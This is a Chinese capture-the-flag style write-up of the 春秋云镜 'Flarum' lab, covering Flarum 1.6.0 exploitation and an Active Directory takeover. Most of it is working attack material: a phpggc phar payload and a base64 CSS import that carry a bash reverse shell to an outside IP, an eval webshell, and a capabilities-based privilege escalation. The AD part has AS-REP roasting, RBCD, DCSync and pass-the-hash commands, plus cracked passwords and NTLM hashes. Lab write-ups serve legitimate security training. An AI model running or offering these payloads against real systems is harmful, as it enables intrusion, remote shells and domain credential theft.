---
title: "春秋云镜 Flarum"
onlyTitle: true
date: 2025-12-18 22:08:48
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8182.png

---



## 春秋云镜 Flarum

### flag1

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251217204029467.png)

只扫出有个web站

主页有个邮箱，还有个注册和登陆接口

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251217204155557.png)

用rockyou爆破一手，这里跑了5k多条都没有，懒得跑了

administrator/1chris

进后台Flarum 1.6.0

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251217210347613.png)

https://tttang.com/archive/1714/

装php弹个shell

```text
php phpggc -p tar -b Monolog/RCE6 system "bash -c 'bash -i >& /dev/tcp/117.72.74.197/1999 0>&1'"
```

跑的时候有个小问题，会报错没开phar可写配置

ERROR: Cannot create phar: phar.readonly is set to 1

找到php.ini修改phar.readonly=On

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218100533195.png)

我这里找很久没找到，就直接加参数了

```
php -d phar.readonly=0 phpggc -p tar -b Monolog/RCE6 system "bash -c 'bash -i >& /dev/tcp/117.72.74.197/1999 0>&1'"
```

然后去修改css

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218101357624.png)



```
@import (inline) 'data:text/css;base64,dGVzdC50eHQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA2NDQAAAAAAAAAAAAAAAAAAAAAADAwMDAwMDAwMDA0ADE1MTIwNjYxMTI2ADAwMDYyNTYgMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhcgAwMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB0ZXN0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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WquXLIV4Et9LA0bIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=';
```

修改完访问/assets/forum.css，可以看到写入了phar文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218101700379.png)

修改完再修改自定义CSS，使用phar协议包含该css文件

```text
.test {
    content: data-uri('phar://./assets/forum.css');
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218101820964.png)

弹回shell

上来先经典看下sudo -l和suid有没有可以提权的，没有信息

>SUID的问题，主要在于权限控制太粗糙。为了对root身份进行更加精细的控制，Linux增加了另一种机制，即capabilities。
>
>libcap提供了getcap和setcap两个命令来分别查看和设置文件的capabilities，同时还提供了capsh来查看当前shell进程的capabilities。
>
>* 主要Capabilities分类
>
>| 能力名称                 | 权限描述                   |
>| ------------------------ | -------------------------- |
>| **CAP_NET_ADMIN**        | 网络接口、路由、防火墙配置 |
>| **CAP_NET_BIND_SERVICE** | 绑定小于1024的端口         |
>| **CAP_SYS_ADMIN**        | 广泛的系统管理权限         |
>| **CAP_DAC_OVERRIDE**     | 绕过文件权限检查           |
>| **CAP_SYS_PTRACE**       | 调试其他进程               |
>| **CAP_CHOWN**            | 修改文件所有者             |
>| **CAP_KILL**             | 发送信号给任意进程         |
>
>> 目前Linux定义了约40种不同的capabilities
>>
>> 每个进程拥有三个能力集：
>>
>> 1. **Effective**（有效集）：内核检查的权限集
>> 2. **Permitted**（允许集）：进程可用的最大权限
>> 3. **Inheritable**（可继承集）：可通过`exec`传递给子进程的权限

https://www.cnblogs.com/f-carey/p/16026088.html

原理就不用看了，比如为一个文件赋予capabilities权限：

```sh
┌──(kali㉿kali)-[~]
└─$ sudo -i
┌──(root💀kali)-[~]
└─# getcap /usr/bin/dumpcap 
┌──(root💀kali)-[~]
└─# setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap
┌──(root💀kali)-[~]
└─# getcap /usr/bin/dumpcap
/usr/bin/dumpcap cap_net_admin,cap_net_raw=eip
```

查找设置了capabilities可执行文件

```sh
getcap -r / 2>/dev/null
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218102555175.png)

```
getcap：显示文件的capabilities。
-r：递归地检查目录中的文件。
/：从根目录开始。
```

`/usr/bin/openssl =ep` 表示这个文件被设置了**空的capabilities集**，但启用了`ep`标志，导致权限绕过或特权升级漏洞

有openssl可用，不输入-e和-d参数的情况下默认就是无加密解密去读原始文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218102830505.png)



读flag：

```
openssl enc -in "/root/flag/flag01.txt"
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218102917739.png)

flag{3f583eec-4d0c-4e6b-bdf2-f3368ac8307e}



### flag3

目标是php的站，可以写phpwebshell连蚁剑传fscan，不过我有vps就直接wget吧

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218104323410.png)

./fscan -h 172.22.60.52/24

```sh
www-data@web01:/tmp$ ./fscan -h 172.22.60.52/24
./fscan -h 172.22.60.52/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.60.8     is alive
(icmp) Target 172.22.60.15    is alive
(icmp) Target 172.22.60.42    is alive
(icmp) Target 172.22.60.52    is alive
[*] Icmp alive hosts len is: 4
172.22.60.15:135 open
172.22.60.42:135 open
172.22.60.42:445 open
172.22.60.15:445 open
172.22.60.8:445 open
172.22.60.42:139 open
172.22.60.15:139 open
172.22.60.8:139 open
172.22.60.8:135 open
172.22.60.52:80 open
172.22.60.52:22 open
172.22.60.8:88 open
[*] alive ports len is: 12
start vulscan
[*] NetInfo 
[*]172.22.60.15
   [->]PC1
   [->]172.22.60.15
   [->]169.254.157.255
[*] NetBios 172.22.60.8     [+] DC:XIAORANG\DC             
[*] NetBios 172.22.60.15    XIAORANG\PC1                  
[*] NetInfo 
[*]172.22.60.8
   [->]DC
   [->]172.22.60.8
   [->]169.254.242.88
[*] NetInfo 
[*]172.22.60.42
   [->]Fileserver
   [->]172.22.60.42
   [->]169.254.140.221
[*] NetBios 172.22.60.42    XIAORANG\FILESERVER           
[*] WebTitle http://172.22.60.52       code:200 len:5867   title:霄壤社区
已完成 12/12
[*] 扫描结束,耗时: 18.188060145s
```

整理下信息

```
172.22.60.8 DC XIAORANG
172.22.60.15 PC1 XIAORANG
172.22.60.42 FileServer XIAORANG
172.22.60.52 本机
```

好像没什么有用的信息，只有IP，以及另外三台主机都在同一个域

目标/var/www/html下config.php有mysql账密，其实也就是网站下的这个页面，没找到的话可以用爬虫从这个页面爬（影刀RPA启动）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218104920017.png)

mysql账密 root/Mysql@root123

gost出来navicat连，但是我本地开了3306，好像有点冲突的样子

先把本地的停止

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218110515034.png)

算了写个shell上蚁剑连数据库吧，public不能写，assets可写

```
cd /var/www/html/public/assets
echo "<?php @eval(\$_POST[1]);?>" > 1.php
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218114313675.png)

神了，蚁剑也连不上

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218114541668.png)

直接蚁剑传哥斯拉马上去

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218114925714.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218115022224.png)

哥斯拉能进数据库，赢了！

>碰到过一个环境就是shell所在的tomcat container没有jdbc的jar包依赖导致连不上数据库，偏偏蚁剑没什么好办法。而在哥斯拉中就不必担心这个问题，在数据库管理中哥斯拉会先从容器中加载可用的jdbc，如果没有就通过内存加载jar驱动来链接数据库。
>
>虽然这里不是java环境，但是哥斯拉连数据库依然是蚁剑连不上的一个选择

flarum_users有数据，把后面的LIMIT去掉然后导出

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218115052045.png)

执行sql然后导出即可

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218115729601.png)

#### AS-REP Roasting

用用户名打AS-REP Roasting

>AS_REP Roasting 攻击
>当被攻击账号设置“不需要Kerberos预身份验证”后，在AS_REP过程中就可以任意伪造用户名请求票据，随后AS会将伪造请求的用户名NTLM Hash加密后返回，然后便可以进行爆破。由于该攻击方式的首要条件默认是不勾选的，这里不再赘述。

```
python GetNPUsers.py -dc-ip 172.22.60.8 xiaorang.lab/ -usersfile C:\Users\Administrator\Desktop\web1.txt
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218122226827.png)

```sh
$krb5asrep$23$wangyun@XIAORANG.LAB:e68885c6ec3826526e7eb4f7f552e6fa$07155ca91a5829fadebb022b168004622a702f3d4e15d3f1c6272b08840da0e1b231bc905ebd44a0ac9f99bed51b2a0d0f818beb4bcb9da2e3b827789440d3fde2c14f5ebb157892cce971cfa5952147ad193abfccdbbbc0ff2950b1bba4c2a8e5e8efbaa8f8083714dbafa4943baa259657e0efda8354e4f7bf19a7ff24efc3f924c5cc0f22d04d77dc3518e09aefc69c4ecae1cf8cad7a62b5e0dbc7957dcc06a1bfb3f8ab887d966cfeb31692c32b2bc3ebe01a6413c90199c1052e489b7afb8d8864fcbf0734d2e4754cc38d5adebc57981e87aee9084426ccf6a5b729d5d593019a593ecfb8989704a3
$krb5asrep$23$zhangxin@XIAORANG.LAB:4cdf46acb8aae907381293631fcb2b89$f894dd958d0ecfab57cfd847be86cef410fedf2ead3b75de93e73db458833a5d851888b8e4ec8a286bda13ac7bb3dd8aa381abc5f716d6864a78d7cc010d897bd0881460af7ca4a2c2bf86f80a3fb96de667e9e54c91c87a21e1cdc8ea4a6d34f575ff9ffcb6d1997716eae2906ca80a5ea7860404e4cc9b5713db64e67e6591595309ce95844c498f455ee34d9ddf57b2e9e424b86549ac63564942654dc8e959f21390ce2ddf47510b51753049925f650233f54ad37453b49b94889a16c5371c7eca44dbd0c170de287ff4193d5911120b8d4465d4ebf2ef9f0133820e506f7ab137b4c8fd40fad9cc14db
```

hashcat爆破一手，wangyun:Adm12geC

没有zhangxin的信息

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218122830067.png)

linux可以直接用bloodhound-python远程收集域信息，而不用把SharpHound传到目标机器上。

但是我都拿到目标机器账密了，还是rdp一下吧，8提醒没有授权这个账户的rdp

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218123144718.png)

连15主机连上了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218123553443.png)

桌面上有个XShell，有个针对Xshell全版本在本地保存的密码进行解密，凭证一键恢复工具。包括最新的7系列版本！

https://github.com/JDArmy/SharpXDecrypt/

那还说啥了，直接丢上去跑，刚好xshell只有windows版的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218125225578.png)

zhangxin/admin4qwY38cc

上传SharpHound进行信息收集

>```
>proxychains bloodhound-python -u wangyun -p Adm12geC -d xiaorang.lab -c all -ns 172.22.60.8 --zip --dns-tcp
>```
>
>问题：为什么用户wangyun在15（假设是IP地址172.22.60.15）才能RDP（远程桌面）上去，但是却能直接对8（172.22.60.8，域控）进行bloodhound信息收集？
>
>- `-ns 172.22.60.8`：指定域名服务器（域控的IP地址）
>- `--dns-tcp`：使用TCP进行DNS查询
>
>这个问题的关键在于理解Active Directory环境中用户权限和网络访问控制。
>
>1. **用户wangyun的账户权限**：在Active  Directory中，每个域用户通常都有一定的权限来查询域内信息。bloodhound-python工具通过LDAP等协议向域控（172.22.60.8）查询域内用户、计算机、组策略等信息。只要域用户能够通过域控的身份验证，并且域控允许该用户进行LDAP查询，那么就可以收集信息。
>2. **RDP权限**：RDP（远程桌面）到某台计算机（如172.22.60.15）需要该计算机上的本地管理员权限或远程桌面用户组权限。这可能是因为wangyun在15号计算机上被授予了远程桌面权限，但不一定在8号计算机（域控）上有远程桌面权限。

所以在任何主机都不能rdp上去的时候，可以用bloodhound-python去收集

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218124136863.png)

可以看到Zhangxin对FILESERVER（172.22.60.42）有Genericall，FILESERVER又对域控有DCSync

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218125324822.png)

那先打RBCD，再打DCSync即可

#### RBCD

```sh
python addcomputer.py xiaorang.lab/zhangxin:admin4qwY38cc -computer-name test1$ -computer-pass '123qwe!@#' -dc-ip 172.22.60.8
#创建用户
```

* 打法1：powerView

下面是获取sid，可以传powerView.ps1上去执行

```sh
#目标机器执行，获取sid
Import-Module .\PowerView.ps1
Get-NetComputer test -Properties objectsid

#根据sid修改msds-allowedtoactonbehalfofotheridentity
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3535393121-624993632-895678587-1116)";$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer FileServer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

然后用getST

```sh
#getST获取ST票据
getST.py -dc-ip 172.22.60.8 xiaorang.lab/test`$:123qwe!@# -spn cifs/Fileserver.xiaorang.lab -impersonate administrator

#引用ccache直接传递票据
$env:kRB5CCNAME='administrator@cifs_Fileserver.xiaorang.lab@XIAORANG.LAB.ccache'
psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk
```

* 打法2：impacket-rbcd

impacket脚本一键完成powerView，也就是修改msds-allowedtoactonbehalfofotheridentity属性(注意windows都是没有单引号包裹参数的)

```sh
python rbcd.py xiaorang.lab/zhangxin:admin4qwY38cc -action write -delegate-from test1$ -delegate-to FILESERVER$ -dc-ip 172.22.60.8
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218130954282.png)

然后申请ST票据

```sh
python getST.py xiaorang.lab/test1$:'123qwe!@#' -spn cifs/FILESERVER.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218131214789.png)

```sh
export KRB5CCNAME=administrator.ccache

#windows用set
set KRB5CCNAME=Administrator@cifs_FILESERVER.xiaorang.lab@XIAORANG.LAB.ccache

python smbexec.py xiaorang.lab/administrator@FILESERVER.xiaorang.lab -target-ip 172.22.60.42 -codec gbk -shell-type powershell -no-pass -k
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218131359966.png)

windows大小写不敏感说是

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218131623188.png)

flag{ec34735b-6677-4b94-b19c-3e203274795d}

### flag2&flag4

改下hosts，加入

172.22.60.42 FILESERVER.xiaorang.lab

然后打Dcsync，本来是用mimikatz抓的，impacket secretsdump也可以

不过这里是用的前面的ccache抓的，也就是test1账户，属于FILESERVER，所以可能只能抓到FILESERVER的hash

> dcsync的两种打法，mimikatz dcsync和secretdump。
>
> ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218213930512.png)

```text
python secretsdump.py -k -no-pass FILESERVER.xiaorang.lab -dc-ip 172.22.60.8
```

找到FiIeserver的域控hash 951d8a9265dfb652f42e5c8c497d70dc

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218132843810.png)

然后用fileserver的账户进行dcsync（如果cmd没输出就有powershell，会显示报错

```
python secretsdump.py 'xiaorang.lab/Fileserver$:@172.22.60.8' -hashes :951d8a9265dfb652f42e5c8c497d70dc -just-dc-user Administrator
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218133426612.png)

Administrator hash，也就是域控上的Administrator，因为指定的主机是8主机，也就是域控。c3cfdc08527ec4ab6aa3e630e79d349b

然后域控是能登陆所有主机的，用这个hash去横向8和15主机拿到flag2和flag4

```
python wmiexec.py -hashes :c3cfdc08527ec4ab6aa3e630e79d349b Administrator@172.22.60.8 -codec gbk
python wmiexec.py -hashes :c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.15 -codec gbk
```



flag02: flag{5f3bab4f-61b0-43c2-a752-504b9f2dfa1a}

